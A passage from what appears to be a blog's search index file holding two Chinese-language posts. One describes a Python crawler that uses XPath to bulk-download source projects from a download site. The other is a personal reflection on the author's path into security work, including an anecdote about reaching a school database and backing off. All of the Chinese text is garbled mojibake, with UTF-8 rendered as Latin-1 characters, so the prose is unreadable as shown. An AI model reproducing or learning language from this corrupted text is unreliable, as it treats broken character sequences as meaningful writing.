alt="æˆªå›¾-2"></p><p>å˜æˆäº†<code>http://down.admin5.com/php/list_30_1.html</code>ã€‚</p><p>é‚£ä¹ˆå°±å¯ä»¥å¾—å‡ºé¡µé¢çš„åœ°å€è§„åˆ™ <code>php/list_30_é¡µç .html</code>ã€‚</p><p><img src="/2018/08/01/crawl-admin5/screenshot-3.png" alt="æˆªå›¾-3"></p><p>è¿™é‡Œä½¿ç”¨<code>XPATHè¡¨è¾¾å¼</code>å¯ä»¥å¾ˆæ–¹ä¾¿çš„è·å–é¡µé¢æ•°æ®ï¼Œ<code>//div[@class=&quot;lists_bigimg_right&quot;]/a</code>ï¼Œè·å–å½“å‰é¡µæ‰€æœ‰é¡¹ç›®è¯¦æƒ…çš„ <code>a</code> æ ‡ç­¾ï¼Œå³è¯¦æƒ…é¡µçš„åœ°å€ã€‚</p><p>éšä¾¿è¿›å…¥ä¸€ä¸ªé¡¹ç›®çš„è¯¦æƒ…ï¼Œæ‰¾åˆ°ä¸‹è½½åœ°å€ã€‚</p><p><img src="/2018/08/01/crawl-admin5/screenshot-4.png" alt="æˆªå›¾-4"></p><p>ä½¿ç”¨ XPATH : <code>//ul[@class=&quot;down-anniu&quot;]//li/a/@href</code>ï¼Œè·å–ä¸‹è½½åœ°å€ï¼Œè¿™æ¡XPATHæ˜¯è·å–æ‰€æœ‰çš„ä¸‹è½½ç‚¹åœ°å€ï¼Œå®é™…ç”¨ä¸åˆ°è¿™ä¹ˆå¤šï¼Œå¯ä»¥ä¿®æ”¹ä¸‹ <code>//ul[@class=&quot;down-anniu&quot;]/li[1]/a/@href</code>ï¼Œåªè·å–1æ¡ã€‚</p><p>å½“ç„¶ï¼Œè¿™ä¸ªé¡µé¢è¿˜åŒ…å«äº†å…¶å®ƒçš„æ•°æ®ï¼ŒåŒæ ·å¯ä»¥ç”¨ XPATH é‡‡é›†ï¼Œå°±ä¸è¯¦ç»†å†™äº†ï¼Œåé¢åœ¨ä»£ç ä¸­ä¼šæœ‰ã€‚</p><h2 id="è¿è¡Œæµç¨‹"><a href="#è¿è¡Œæµç¨‹" class="headerlink" title="è¿è¡Œæµç¨‹"></a>è¿è¡Œæµç¨‹</h2><p>ä¸‹é¢æ¢³ç†ä¸‹æˆ‘ä»¬çˆ¬è™«çš„è¿è¡Œæµç¨‹ã€‚</p><ol><li><p>è®¿é—®<code>http://down.admin5.com/php/</code>ï¼Œ<code>asp</code>,<code>.net</code>ç­‰è¯­è¨€é¡¹ç›®çš„é¡µé¢å…¶å®æ˜¯ä¸€æ ·çš„ï¼Œæ”¹ä¸‹è·¯å¾„å°±è¡Œï¼Œè¿™é‡Œä»¥<code>php</code>çš„ä¸ºä¾‹ã€‚</p></li><li><p>è·å–åç»­é¡µé¢çš„åœ°å€ï¼Œå³ä¸‹ä¸€é¡µã€‚ç”±äº<code>Admin5</code>çš„é¡µé¢æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ç›´æ¥è·å–æ€»é¡µæ•°ï¼Œç„¶åç”¨<code>for</code>å¾ªç¯ï¼Œéå†<code>http://down.admin5.com/php/list_30_é¡µç .html</code>ã€‚</p></li><li><p>è·å–æ¯ä¸ªé¡¹ç›®çš„è¯¦ç»†é¡µåœ°å€ï¼Œå¹¶è·Ÿè¿›ã€‚</p></li><li><p>æå–é¡¹ç›®çš„è¯¦ç»†å‚æ•°ï¼Œè·å–ä¸‹è½½åœ°å€ï¼ŒåŠ å…¥ä¸‹è½½é˜Ÿåˆ—ã€‚</p></li><li><p>ä¸‹è½½æ¨¡å—ä¸æ–­å–å‡ºé˜Ÿåˆ—çš„ä»»åŠ¡ï¼Œä¸‹è½½é¡¹ç›®ï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºã€‚</p></li></ol><h2 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h2><p>è¿™ä¸ªé¡¹ç›®æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥æ²¡æœ‰ç”¨<code>scrapy</code>ç­‰å¾ˆé‡çš„æ¡†æ¶å»åšã€‚å°±ç”¨æœ€ç®€å•çš„<code>requests</code>åº“å»å®ç°ï¼Œä¸‹é¢è®¾è®¡ä¸€ä¸‹å…·ä½“çš„ä¸šåŠ¡æ¨¡å‹ã€‚</p><h3 id="æ¨¡å‹"><a href="#æ¨¡å‹" class="headerlink" title="æ¨¡å‹"></a>æ¨¡å‹</h3><ol><li>ProjectItem<ul><li>name</li><li>size</li><li>update_date</li><li>official_url</li><li>download_url</li></ul></li></ol><p>è¿™ä¸ªæ¨¡å‹åŒ…å«æ¯ä¸ªé¡¹ç›®çš„å±æ€§ï¼ŒåŒ…æ‹¬é¡¹ç›®åç§°ï¼Œå¤§å°ï¼Œæ›´æ–°æ—¥æœŸï¼Œå®˜æ–¹åœ°å€ï¼Œä¸‹è½½åœ°å€ã€‚</p><ol start="2"><li>Downloader<ul><li>download_queue</li><li>cache_path</li><li>save_path</li><li>add_task(projcet_item)</li><li>print_progress()</li><li>save_cache()</li></ul></li></ol><p>ä¸‹è½½å™¨ï¼Œè¿™ä¸ªæ¨¡å‹è´Ÿè´£ä¸‹è½½é¡¹ç›®ï¼Œç»´æŠ¤ä¸‹è½½é˜Ÿåˆ—ï¼Œç›‘æ§ä¸‹è½½è¿›åº¦ï¼Œå¹¶å¯¹ä¸‹è½½è¿‡çš„é¡¹ç›®åœ°å€åšç¼“å­˜ï¼Œé˜²æ­¢é‡å¤ä¸‹è½½ã€‚</p><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><p>å·²ä¸Šä¼ åˆ° <a href="https://github.com/CHN-Jaylin/Spider/tree/master/admin5" target="_blank" rel="noopener">Github</a>ï¼Œ å…·ä½“å®ç°è¯·æŸ¥çœ‹ä»£ç ï¼Œæ³¨é‡Šå·²ç»å†™çš„æ¯”è¾ƒæ¸…æ¥šäº†ã€‚</p><h4 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h4><p><img src="/2018/08/01/crawl-admin5/screenshot-5.png" alt="æˆªå›¾-5"></p><p>å·²ç»å®ç°äº†è‡ªåŠ¨ä¿å­˜ä¸‹è½½è¿›åº¦ï¼Œå¯ä»¥éšæ—¶<code>Ctrl+C</code>é€€å‡ºç¨‹åºï¼Œä¸‹æ¬¡æ‰§è¡Œæ—¶ä¼šè·³è¿‡å·²ä¸‹è½½çš„é¡¹ç›®ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ˜¨å¤©ï¼Œæ˜å¤©</title>
      <link href="/2018/07/31/yesterday-and-tomorrow/"/>
      <url>/2018/07/31/yesterday-and-tomorrow/</url>
      
        <content type="html"><![CDATA[<p>åœ¨äºŒé›¶ä¸€å…«å¹´ä¸ƒæœˆçš„å°¾å·´ï¼Œå†™ä¸‹è¿™ç¯‡æ–‡ç« ã€‚ç®—æ˜¯å¯¹è¿‡å»çš„ä¸€ä¸ªå›å¿†æ€»ç»“ï¼Œè¿˜æœ‰æœªæ¥çš„è®¡åˆ’ã€‚</p><p>åšå®‰å…¨ï¼Œæ˜¯æˆ‘é«˜ä¸­æ—¶å€™å°±æœ‰çš„æƒ³æ³•ã€‚é‚£ä¸ªæ—¶å€™WooYunè¿˜åœ¨ï¼Œæˆ‘è¿˜è®°å¾—æ›¾ç»æŒ–åˆ°ä¸€ä¸ªå°å‚çš„ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ¼æ´ï¼Œæ³¨å†Œäº†ç¬¬ä¸€ä¸ªè´¦å·ï¼Œè¸ä¸Šäº†æˆ‘åœ¨å®‰å…¨è·¯ä¸Šçš„ç¬¬ä¸€æ­¥ã€‚</p><p>é«˜ä¸­çš„æ—¶å€™ä½æ ¡ï¼Œæ‰‹æœºæŸ¥çš„è¿˜ä¸¥ã€‚æ¯å¤©æœ€å¼€å¿ƒçš„å°±æ˜¯çªåœ¨è¢«å­é‡Œï¼Œç¿»ç€WooYunï¼Œé€›é€›Zoneã€‚çœ‹çœ‹ä»Šå¤©è°å®¶Struts2çš„æ´è¿˜æ²¡è¡¥ï¼Œå“ªä¸ªå‚çš„è£¤å­åˆè¢«è„±äº†ã€‚å½“ç„¶ï¼Œè¿˜æœ‰å„è·¯å¤§ä½¬åˆ†äº«çš„å¥‡æŠ€æ·«å·§ï¼Œä¸€å“¥çŒªçŒªä¾ ï¼Œç”»æ¼«ç”»çš„å°å·â€¦â€¦</p><p>å¤§å­¦ï¼Œæˆ‘æ¥åˆ°ç¦»å®¶1500KMçš„æˆéƒ½ï¼Œå› ä¸ºå„ç§åŸå› ï¼Œé€‰äº†ä¸€ä¸ªä¸å–œæ¬¢çš„ä¸“ä¸šï¼ŒåŠ äº†å­¦ç”Ÿä¼šï¼Œæ¯å¤©éƒ½è®©è‡ªå·±å¾ˆå¿™ï¼Œå¸¸å¸¸æ˜¯é€šå®µåœ¨å·¥ä½œï¼Œä¹Ÿæ²¡æœ‰æ—¶é—´å†å»å…³æ³¨å®‰å…¨åœˆã€‚ç¬¬ä¸€ä¸ªå­¦æœŸçš„å­¦æœŸæœ«ï¼Œé‡è¦çš„å‡ é—¨ä¸“ä¸šåŸºç¡€è¯¾è¿˜æ˜¯éƒ½ä¸æ‡‚ã€‚æˆ‘æ„è¯†åˆ°è¿™ä¸ªä¸“ä¸šçœŸçš„ä¸é€‚åˆæˆ‘ï¼Œå³ä½¿æ¯•ä¸šäº†ï¼Œæˆ‘ä¹Ÿä¸ä¼šå»åšè¿™è¡Œã€‚æŸä¸ªæ™šä¸Šï¼Œæˆ‘æ‰¯å‡ºè·¯ç”±å™¨ä¸Šçš„ç½‘çº¿ï¼Œè¿ä¸Šå­¦æ ¡å†…ç½‘ï¼Œä¸å°å¿ƒæ‹¿åˆ°äº†æ”¯æ’‘å­¦æ ¡æ ¸å¿ƒæ•°æ®åº“ï¼Œæ€è€ƒäº†è®¸ä¹…ï¼Œè¿˜æ˜¯å…³æ‰äº†ç»ˆç«¯â€¦</p><p>ç¬¬äºŒä¸ªå­¦æœŸï¼Œä¸é¡¾å®¶äººåå¯¹ï¼Œæˆ‘è½¬åˆ°äº†è½¯ä»¶ä¸“ä¸šï¼Œå­¦ä¹ è½¯ä»¶å¼€å‘ã€‚ç¯å¢ƒåŸå› ï¼Œç­ä¸Šçš„è®¡ç®—æœºæ°´å¹³éƒ½ä¸è¡Œï¼Œå‡­ç€é«˜ä¸­æ”’ä¸‹çš„çŸ¥è¯†ï¼ŒåŠæ‰“å¤§éƒ¨åˆ†äººã€‚æˆ‘å¼€å§‹å‚åŠ å„ç§æ¯”èµ›ï¼Œç§»åŠ¨å¼€å‘ï¼Œå¤§æ•°æ®ï¼Œè½¯ä»¶æ¯ã€‚ä¸€è·¯è¿‡æ¥ï¼Œç»å†äº†å¾ˆå¤šï¼Œæ‰¿æ‹…äº†å¾ˆå¤šï¼Œæ”¶è·äº†å¾ˆå¤šï¼Œå¯ä»¥è¯´æ˜¯æˆ‘äººç”Ÿæˆé•¿æœ€å¤šçš„å†ç¨‹ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘è¿·å¤±è¿‡ï¼Œç‰¹åˆ«æ˜¯æˆ‘æ·±å…¥å¼€å‘ä¹‹åï¼Œæˆ‘å‘ç°ITçš„æ–¹å‘åŸæ¥è¿™ä¹ˆå¤šï¼Œæˆ‘å¯¹æ¯ä¸ªæ–¹å‘éƒ½æ„Ÿå…´è¶£ï¼Œä½†ä¸€ä¸ªäººä¸å¯èƒ½æŠŠæ¯æ¡è·¯èµ°é€šï¼Œå¿…é¡»æ‰¾ä¸€æ¡åˆé€‚è‡ªå·±è·¯ã€‚å¼€å‘è¿™æ¡è·¯ï¼Œæˆ‘èµ°äº†å¾ˆä¹…ï¼Œä¹Ÿåšè¿‡è‡ªå·±å¼•ä»¥ä¸ºå‚²çš„ä½œå“ã€‚ä¸è¿‡æˆ‘ä¸å–œæ¬¢åšä¸šåŠ¡ï¼Œåƒæ˜¯æ¬ç –ä¸€æ ·çš„å †ç Œä»£ç ï¼Œå†™æ²¡æœ‰çµé­‚çš„ç¨‹åºï¼Œæ‰€ä»¥ï¼Œæ˜¯æ—¶å€™å›å»äº†ã€‚</p><p>è¿™ä¸€å¹´ï¼Œæœ€å¼€å¿ƒçš„äº‹è«è¿‡äºé€šè¿‡å‡æœ¬è€ƒè¯•ï¼Œæ¥ä¸‹æ¥çš„ä¸¤å¹´ï¼Œæˆ‘å°†åœ¨CUITç»§ç»­å­¦ä¹ ã€‚CUITæœ€å‡ºåçš„ï¼Œå°±æ˜¯ä¿¡æ¯å®‰å…¨äº†å§ï¼Œä¹Ÿæ˜¯ç‰›äººäº‘é›†çš„åœ°æ–¹ã€‚å¸Œæœ›å¤šå¹´ä»¥åï¼Œå†çœ‹è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œæˆ‘ä¹Ÿæ˜¯ä¸€æšå¤§ä½¬äº†ã€‚</p><p>ä¸å¿˜åˆå¿ƒï¼Œæ–¹å¾—å§‹ç»ˆã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ—¥å¸¸ </tag>
            
            <tag> å¿ƒè·¯ </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
